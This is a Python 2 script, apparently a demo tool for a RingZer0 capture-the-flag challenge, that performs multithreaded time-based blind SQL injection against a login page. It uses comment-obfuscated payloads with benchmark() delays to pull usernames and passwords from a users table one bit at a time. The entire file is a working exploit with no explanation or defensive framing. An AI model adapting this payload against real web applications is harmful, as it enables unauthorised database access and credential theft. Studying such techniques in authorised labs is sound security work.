'''
@attention: uninjector4 demo
@author: mrun1k0d3r
'''
import Queue
import threading
import urllib2
import urllib
import time
import sys

threads_response = []

def request(position, char_position):
    global threads_response
    data = "admin')/**/&&/**/case/**/when/**/(SUBSTRING(REVERSE(CONV(HEX(SUBSTRING((SELECT/**/GROUP_CONCAT(username,0x7c,password)/**/FROM/**/login5.users)," + str(char_position) + ",1)),16,2))," + str(position) + ",1))=1/**/then/**/benchmark(55000000,(select/**/1))/**/end/**/#"
    request = urllib2.Request("http://ringzer0team.com:31337/login5.php")
    # print data
    start = time.time()
    urllib2.urlopen(request, "username=" + urllib.quote(data) + "&password=admin")
    if time.time() - start >= 1:
        threads_response.append([position, 1])
    else:
        threads_response.append([position, 0])
        
def build_char(thread_array):
    #this shit is ugly better way to do using 1 loop
    char = ""
    for i in range(1, 8):
        for item in thread_array:
            if item[0] == i:
                char += str(item[1])
    char += "0"
    return char
   
# main    

def mymain():
    global threads_response
    threads_pool = []
    i = 1
    char = ""
    string = ""
    while not char == "00000000": 
        if len(char) == 8:
            char = str(chr(int(char[::-1], 2)))
            print char
            string += char
            char = ""
        for b in range(1, 8): 
            t = threading.Thread(target=request, args=(b, i))
            t.deamon = True
            threads_pool.append(t)
            t.start()

        # Wait for all threads
        [x.join() for x in threads_pool]
        char = build_char(threads_response)
        threads_response = []
        threads_pool = []
        i += 1
    print string

if __name__ == "__main__":
    mymain()
